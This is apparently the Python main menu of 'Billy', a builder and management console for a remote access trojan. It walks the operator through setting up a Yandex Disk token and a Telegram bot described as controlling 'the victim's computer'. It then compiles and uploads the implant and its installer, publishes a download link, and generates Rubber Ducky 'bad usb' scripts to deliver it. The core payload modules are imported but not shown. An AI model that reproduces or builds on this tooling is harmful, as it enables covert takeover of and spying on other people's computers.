import Branch
import constants
import Colors
import config
import Sygnal
import Update
from __init__ import __version__, __longname__, __author__
import warnings


def greeting():
    greeting_image = r"""                                                                                                    {greet_color2}  ______
{greet_color1}@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@{greet_color2} |_   _ \
{greet_color1}@@@@@@@@@@@@@@%%%@@%@@@@@@@@@@@@@@@@@@@@@@@@@#%@@@@@@@@@@@@@@@@@@@#=::::+@@@@@@@@@@@@@@@@@@@@@@@@@@@{greet_color2}   | |_) |
{greet_color1}@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@%%**%#**#+%@@@@@@@@@@@@@*:=-==-:...:%@@@@@@@@@@@@@@@@@@@@@@@@{greet_color2}   |  __'.
{greet_color1}@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#%%%##%%%%*+%@@@@@@@@@@%+-+:=-=:==+:.*@@@@@@@@@@@@@@@@@@@@@@@{greet_color2}  _| |__) | 
{greet_color1}@@@@@@@@@@@@@@%@@@@@@@@@@%#@@@@@@@@@@@@%##*+-..::++#@@@@@@@@@@@*+#+*+#%#+++-.=@@@@@@@@@@@@@@@@@@@@@@{greet_color2} |_______/  
{greet_color1}@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@##*=-::.::-*@@@@@@@@@@@@@@@@@@@@@#==--:.*@@@@@@@@@@@@@@@@@@@@{greet_color2}   _____ 
{greet_color1}@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%**%%++*+-:=%@@@@@@@@@@@@@@@@@@@@@%+==-::.-%@@@@@@@@@@@@@@@@@@{greet_color2}  |_   _|
{greet_color1}@@@@@@@@@@@@@@@@%%@@@@@@@@@@@@@@@@@@##***+*+:+++-=+%@@@@@@@@@@@@@@@@@@@@%+===-::..%@@@@@@@@@@@@@@@@@{greet_color2}    | |  
{greet_color1}@@@@@@@@@@@@@@@@%#@@%%@@%%@@@@@@@@@%#******+:-:--==%@@@@@@@@@@@@@@@@@@@@%+====-::.:%@@@@@@@@@@@@@@@@{greet_color2}    | |  
{greet_color1}@@@@@@@@@@@@@@%%@@@@@@%*%@@@@@@@@@@@@%*+*###=---==@@@@@@@@@@@@@@@@@@@@@@@+++===-::.-@@@@@@@@@@@@@@@@{greet_color2}   _| |_ 
{greet_color1}@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#*###*--+=+*@@@@@@@@@@@@@@@@@@%%%%@@%#*+====-::#@@@@@@@@@@@@@@@{greet_color2}  |_____|
{greet_color1}@@@@@@@@@@@@@@@@%##@%%@@@@@@@@@@@@@@%%#%%#*==*#*@@@@@@@@@@#***%@%-:::::.=++++===+=-:-@@@@@@@@@@@@@@@{greet_color2}   _____  
{greet_color1}@@@@@@@@@@@@@@@%#%%%%@@@@@@@%###%#########%%%#=*@@@@@%*=-:::..:=-:::::::::-===--:::-%@@@@@@@@@@@@@@@{greet_color2}  |_   _| 
{greet_color1}@@@@@@@@@@@@@@%%%@@@@@#+=-::--::+####%###***=--**#%**+=-::...:--------:::----==++#@@@@@@@@@@@@@@@@@@{greet_color2}    | |   
{greet_color1}@@@@@@@@@@@@@@@@@@@@###*+-----:..:--------:-=-:-:::----::::::==+===----:::--=+*%@@@@@@@@@@@@@@@@@@@@{greet_color2}    | |   _ 
{greet_color1}@@@@@@@@@@@@@@@@@@@#%#***=---------:-----::::=-::::-::::::::=+++++=======++*#@@@@@@@@@@@@@@@@@@@@@@@{greet_color2}   _| |__/ |
{greet_color1}@@@@@@@@@@@@@@@@@@#******++======--------:..:-=-::::::::::-*+++*++===++**#@@@@@@@@@@@@@@@@@@@@@@@@@@{greet_color2}  |________|
{greet_color1}@@@@@@@@@@@@@@@@@@+.--=*****++++===-------:.::==--::.:::--::+=+#**+*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@{greet_color2}   _____  
{greet_color1}@@@@@@@@@@@@@@@@@@+:==:=+**#***++====----::.:.===-::::----:.:=*%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@{greet_color2}  |_   _| 
{greet_color1}@@@@@@@@@@@@@@@@@#*++=++*##*-=+***++===---::::====----+-:--::-#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@{greet_color2}    | |   
{greet_color1}@@@@@@@@@@@@@@@@%*=##******#%#--=*#**+=====-::---:..::-::::::+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@{greet_color2}    | |   _ 
{greet_color1}@@@@@@@@@@@@@@@@@#:*##*####%%##+:=******===---::-:::----::::-%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@{greet_color2}   _| |__/ |
{greet_color1}@@@@@@@@@@@@@@@@%#.=##*###%%###+:-+***+======-----:..::---:-=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@{greet_color2}  |________|
{greet_color1}@@@@@@@@@@@@@@@@@+:=#*###%@@@##+:=+****======--::-----=-=---=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@{greet_color2}  ____  ____
{greet_color1}@@@@@@@@@@@@@@@@@+-+##%%%%@@@@@+:-:-+*+===+==-------::::----*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@{greet_color2} |_  _||_  _|
{greet_color1}@@@@@@@@@@@@@@@@%+###%%%%@@@@@@%-.=+++++==+====--:----:---:-=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@{greet_color2}   \ \  / / 
{greet_color1}@@@@@@@@@@@@@@@@#+###%%%%@@@@@@@%:.:=++++======---===-::-=+*++%@@@@@@@@@@@@@@@@@@@@@@%%@@@@@@@@@@@@@{greet_color2}    \ \/ /
{greet_color1}@@@@@@@@@@@@@@@@**#*#%%%%@@@@@@@@#::-=+**+++**+++--===-+=-==***%@@@@@@@@@@%#%@@@@@@@@%@@@@@@@@@@@@@@{greet_color2}    _|  |_ 
{greet_color1}@@@@@@@@@@@@@@@@**#*#%%%@@@@@@@@@#::-+**+++**+++--===-+=--==***%@@@@@@@@@@%#%@@@@@@@*+@@@@@@@@@@@@@@{greet_color2}   |______| 
""".format(greet_color1=Colors.greet_color1, greet_color2=Colors.greet_color2)
    print(greeting_image)


def print_modes(modes):
    modes = list(modes)

    for i in range(len(modes)):
        print("{default_color}{index}) {value_color}{mode}".format(
            index=i+1, mode=modes[i], value_color=Colors.value_color, default_color=Colors.default_color))


def get_mode(modes):
    message = "{input_pref}Write number of mode, you want to use: {value_color}".format(
        input_pref=Colors.input_pref, value_color=Colors.value_color)
    modes = list(modes)
    while True:
        number_of_mode = input(message).strip()

        if number_of_mode.isdigit() and 0 < int(number_of_mode) <= len(modes):
            return modes[int(number_of_mode) - 1]
        else:
            message = '{error_pref}Incorrect. Input must be number and be in range [1-{length}]: {value_color}'.format(
                error_pref=Colors.error_pref, length=len(modes), value_color=Colors.value_color)


def exit():
    print('{default_pref}Exit...'.format(default_pref=Colors.default_pref))
    return 0


def processing():
    print(constants.PROCESSING, end='', flush=True)


def clear_processing():
    print()
    Colors.clearLine(count_of_lines=2)


def createNewBranch():
    message = "{about_pref}Let's start! First you need to create an account on Yandex disk (https://disk.yandex.com.am/), and an access OAuth-token (https://oauth.yandex.ru/) that allows you to access it. \n".format(about_pref=Colors.about_pref) + \
        constants.default_get_network_token_message
    network_token = Branch.get_network_token(message=message)

    message = "{about_pref}You must create a telegram bot (https://t.me/BotFather) through which you want to control the victim's computer. \n".format(about_pref=Colors.about_pref) + \
        constants.default_get_bot_token_message
    bot_token = Branch.get_bot_token(message=message)

    message = "\n{default_pref}Please write name of the branch you want to create: {value_color}".format(
        default_pref=Colors.default_pref, value_color=Colors.value_color)
    error_message = 'The branch already exists or the length of the branch is not in range [1:{max_length_of_branch_name}]. Please try again: {value_color}'.format(
        max_length_of_branch_name=config.max_length_of_branch_name, about_pref=Colors.about_pref, value_color=Colors.value_color)
    branch_name = Branch.get_new_branch_name(
        message=message, error_message=error_message, network_token=network_token)

    message = "\n{about_pref}You have to get telegram id (find out yours https://t.me/getmyid_bo) you want to manage bot (later you can add other). \n".format(about_pref=Colors.about_pref) + \
        constants.default_get_telegram_id_message
    telegram_id = Branch.get_telegram_id(message=message)

    Branch.edit_sample(network_token, branch_name, telegram_id)

    Branch.create_branch_dir(network_token, branch_name)

    print('\n{default_pref}Uploading sample...'.format(
        default_pref=Colors.default_pref))
    Branch.upload_sample(network_token, branch_name)

    print('\n{default_pref}Editing parser...'.format(
        default_pref=Colors.default_pref))
    Branch.edit_parser(network_token, branch_name, bot_token)

    print('\n{default_pref}Compiling...'.format(
        default_pref=Colors.default_pref))
    status, paths = Branch.compile()

    Branch.restore_sample(network_token, branch_name, telegram_id)

    if not status:
        print("\n{error_pref}Error occured compiling Billy or Installer: ".format(
            error_pref=Colors.error_pref))
        print(paths, end='')
        Branch.delete_network_brunch(network_token, branch_name)
        Branch.delete_brunch_from_parser(network_token, branch_name)
        Branch.delete_binary_files()
        return 1

    print('\n{default_pref}Uploading...'.format(
        default_pref=Colors.default_pref))
    Branch.upload_Billy_and_Installer(network_token, branch_name, *paths)

    print('\n{default_pref}Deleting binary files...'.format(
        default_pref=Colors.default_pref))
    Branch.delete_binary_files()

    print('\n{default_pref}Creating Ducky Rubber Scripts for bad usb...'.format(
        default_pref=Colors.default_pref))
    link = Branch.public_Installer(network_token, branch_name)
    rubber_ducky_script_path = Branch.create_rubber_ducky_script(
        branch_name, link)

    print('\n{default_pref}Successfully created Billy branch "{branch_name}".'.format(
        default_pref=Colors.default_pref, branch_name=branch_name))

    print('\n{default_pref}Path to Rubber Ducky script:'.format(
        default_pref=Colors.default_pref), f'"{rubber_ducky_script_path}"')
    print("{default_pref}URL to installer Billy:".format(
        default_pref=Colors.default_pref), link)

    return 1


def print_branches(branches=-1):
    if branches == -1:
        network_token = Branch.get_network_token()

        processing()
        branches = Branch.get_branches(network_token)
        clear_processing()

    if not branches:
        print("{error_pref}You haven't any branches.".format(
            error_pref=Colors.error_pref))
        return 0

    print('{default_pref}Branches:'.format(
        default_pref=Colors.default_pref))

    for i in range(len(branches)):
        branch_name, branch_os = branches[i]
        print("{default_color}{index}) {value_color}{branch_name}{offset}{default_color}{branch_os}".format(
            index=i+1, branch_name=branch_name, default_color=Colors.default_color, value_color=Colors.value_color, branch_os=branch_os, offset=' '*(51 - len(branch_name) if len(branch_name) < 50 else 105 - len(branch_name))))

    return 1


def delete_branch():
    network_token = Branch.get_network_token()

    processing()
    branches = Branch.get_branches(network_token)
    clear_processing()

    if not print_branches(branches):
        return 1

    message = "{input_pref}Write number of branch, you want to delete: {value_color}".format(
        input_pref=Colors.input_pref, value_color=Colors.value_color)
    branch_name = Branch.get_branch_for_list(branches, message)

    processing()

    Branch.delete_network_brunch(network_token, branch_name)

    Branch.delete_brunch_from_parser(network_token, branch_name)

    Branch.delete_rubber_ducky_script(branch_name)

    clear_processing()

    print('\n{default_pref}Successfully deleted Billy branch "{branch_name}".'.format(
        default_pref=Colors.default_pref, branch_name=branch_name))

    return 1


def edit_network_token():
    message = '{input_pref}Write new Yandex OAuth-token: {value_color}'.format(
        input_pref=Colors.input_pref, value_color=Colors.value_color)

    Branch.get_network_token(message=message, only_input=True)

    print('{default_pref}Sucessfully edited OAuth token.'.format(
        default_pref=Colors.default_pref))

    return 1


def manage_branch():
    network_token = Branch.get_network_token()

    processing()
    branches = Branch.get_branches(network_token)
    clear_processing()

    if not print_branches(branches):
        return 1

    message = "{input_pref}Write number of branch, you want to manage: {value_color}".format(
        input_pref=Colors.input_pref, value_color=Colors.value_color)
    branch_name = Branch.get_branch_for_list(branches, message)

    modes = {'Edit bot token': lambda: edit_bot_token(
        branch_name, network_token),
        'Exit': lambda: 1}

    print('\n{default_pref}Modes:'.format(
        default_pref=Colors.default_pref))
    print_modes(modes)

    mode = get_mode(modes)

    function = modes[mode]

    function()

    return 1


def edit_bot_token(branch_name, network_token):
    message = '\n' + constants.default_get_bot_token_message
    bot_token = Branch.get_bot_token(message=message)

    processing()
    Branch.edit_parser(network_token, branch_name, bot_token)
    clear_processing()

    print("\n{default_pref}Bot token edited.".format(
        default_pref=Colors.default_pref))

    return 1


def change_compile_commands():
    modes = {'Change Installer compile command': change_Installer_compile_command,
             'Change Billy compile command': change_Billy_compile_command}

    print('{default_pref}Modes:'.format(
        default_pref=Colors.default_pref))
    print_modes(modes)

    mode = get_mode(modes)

    function = modes[mode]

    function()

    return 1


def change_Installer_compile_command():
    Billy_compile_command, Installer_compile_command = Branch.get_compile_commands()

    print('\n{input_pref}Installer compile command:{value_color}'.format(
        input_pref=Colors.input_pref, value_color=Colors.value_color), Installer_compile_command)

    message = 'Do you want to edit command?'.format(
        default_pref=Colors.default_pref)

    if not ask_message(message):
        return 1

    message = '{input_pref}Write a new command for compilation: {value_color}'.format(
        input_pref=Colors.input_pref, value_color=Colors.value_color)

    compile_command = input(message)

    Branch.change_Installer_compile_command(compile_command)

    print('\n{default_pref}Command changed.'.format(
        default_pref=Colors.default_pref))


def change_Billy_compile_command():
    Billy_compile_command, Installer_compile_command = Branch.get_compile_commands()

    print('\n{input_pref}Billy compile command:{value_color}'.format(
        input_pref=Colors.input_pref, value_color=Colors.value_color), Billy_compile_command)

    message = 'Do you want to edit command?'.format(
        default_pref=Colors.default_pref)

    if not ask_message(message):
        return 1

    message = '{input_pref}Write a new command for compilation: {value_color}'.format(
        input_pref=Colors.input_pref, value_color=Colors.value_color)

    compile_command = input(message)

    Branch.change_Billy_compile_command(compile_command)

    print('\n{default_pref}Command changed.'.format(
        default_pref=Colors.default_pref))


def about():
    print("\n{default_pref}{__longname__} \n{default_pref}Version: {__version__}. \n{default_pref}Author: {__author__}.".format(
        default_pref=Colors.default_pref, __longname__=__longname__, __version__=__version__, __author__=__author__))
    return 1


def ask_message(message):
    true_answer = 'y'
    false_answer = 'n'

    message = '\n{question_pref}{message} Y/n: {value_color}'.format(
        value_color=Colors.value_color, question_pref=Colors.question_pref, message=message)

    while True:

        answer = input(message)

        if answer.lower() == true_answer:
            Colors.clearLine(count_of_lines=2)
            return 1

        if answer.lower() == false_answer:
            Colors.clearLine(count_of_lines=2)
            return 0

        Colors.clearLine(count_of_lines=2)
        message = '{error_pref}Invalid input. Please try again. Y/n: {value_color}'.format(
            error_pref=Colors.error_pref, value_color=Colors.value_color)


def check_update():
    check_update_status = Update.check_for_update()

    if not check_update_status:
        return 1

    latest_release_version, latest_release_url = check_update_status

    print("\n{default_pref}Update available! {__version__} --> {latest_release_version}. \n{latest_release_url}\n".format(
        default_pref=Colors.default_pref, __version__=__version__, latest_release_version=latest_release_version, latest_release_url=latest_release_url))


def check_exit():
    message = '\n{default_color}Press [ENTER] to exit to menu...'.format(
        default_color=Colors.default_color)
    input(message)


def main():
    Sygnal.process_signal()
    warnings.filterwarnings("ignore", category=SyntaxWarning)

    modes = {'Get branches': print_branches,
             'Add branch': createNewBranch,
             'Delete branch': delete_branch,
             'Edit OAuth-token': edit_network_token,
             'Manage branch': manage_branch,
             'Change compile commands': change_compile_commands,
             'About': about,
             'Exit': exit}

    while True:

        Colors.clearConsole()

        greeting()

        check_update()

        print('{default_pref}Modes:'.format(
            default_pref=Colors.default_pref))

        print_modes(modes)

        mode = get_mode(modes)

        function = modes[mode]

        Colors.clearConsole()
        greeting()

        ans = function()

        if not ans:
            return 1

        check_exit()


if __name__ == '__main__':
    main()
